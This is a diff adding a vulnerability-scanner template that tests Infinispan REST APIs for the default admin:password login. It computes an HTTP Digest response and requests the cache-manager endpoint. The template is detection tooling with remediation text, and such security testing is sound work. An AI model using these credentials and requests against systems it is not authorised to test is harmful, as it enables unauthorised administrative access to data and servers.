@@ -1,0 +1,71 @@
+id: infinispan-default-admin-login
+
+info:
+  name: Infinispan 默认管理员凭据登录漏洞
+  author: DhiyanesDk
+  severity: high
+  description: |
+    Infinispan REST API 因使用默认管理员凭据 `admin:password` 而暴露，未认证的网络攻击者可借助 HTTP Digest 完成身份认证，进而获取对所有缓存管理器、缓存及服务器管理端点的完全读写权限。
+
+    参考链接：https://github.com/infinispan/infinispan
+  reference:
+    - https://infinispan.org/docs/stable/titles/security/security.html
+    - https://infinispan.org/
+  metadata:
+    max-request: 2
+    verified: true
+    vendor: redhat
+    product: infinispan
+    shodan-query: http.favicon.hash:647951307
+  tags: Infinispan
+  remediation: >-
+    升级受影响产品至最新的厂商支持版本，并安装所有可用的安全补丁。如果暂时无法升级，应限制对受影响端点的访问，尽可能禁用存在风险的功能，并采取身份认证、网络隔离和请求过滤等补偿性措施。同时检查相关 日志，并轮换可能已暴露的凭据或密钥。
+
+flow: http(1) && http(2)
+
+variables:
+  username: "admin"
+  password: "password"
+
+http:
+  - raw:
+      - |
+        GET /rest/v2/cache-managers/default HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 401'
+          - 'contains(tolower(header_1), "digest realm=")'
+        condition: and
+        internal: true
+    extractors:
+      - type: regex
+        name: realm
+        part: header
+        group: 1
+        regex:
+          - 'realm="([^"]+)"'
+        internal: true
+      - type: regex
+        name: nonce
+        part: header
+        group: 1
+        regex:
+          - 'nonce="([^"]+)"'
+        internal: true
+  - raw:
+      - |
+        GET /rest/v2/cache-managers/default HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        Authorization: Digest username="{{username}}", realm="{{realm}}", nonce="{{nonce}}", uri="/rest/v2/cache-managers/default", qop=auth, nc=00000001, cnonce="0a4f113b", response="{{md5(concat(md5(concat(username,":",realm,":",password)),":",nonce,":00000001:0a4f113b:auth:",md5("GET:/rest/v2/cache-managers/default")))}}", algorithm=MD5
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(body, "\"name\"", "\"cache_manager_status\"")'
+        condition: and
+
+# digest: 4b0a00483046022100afa7f6ccdbb8f26f5da99d449c9ee0cdc0e5246a464961bcd6e29d60affa621c022100984d6b7cb6800f661ec1e5334810ded837a213e8687063e76858a7e5ffc1e019:922c64590222798bb761d5b6d8e72950
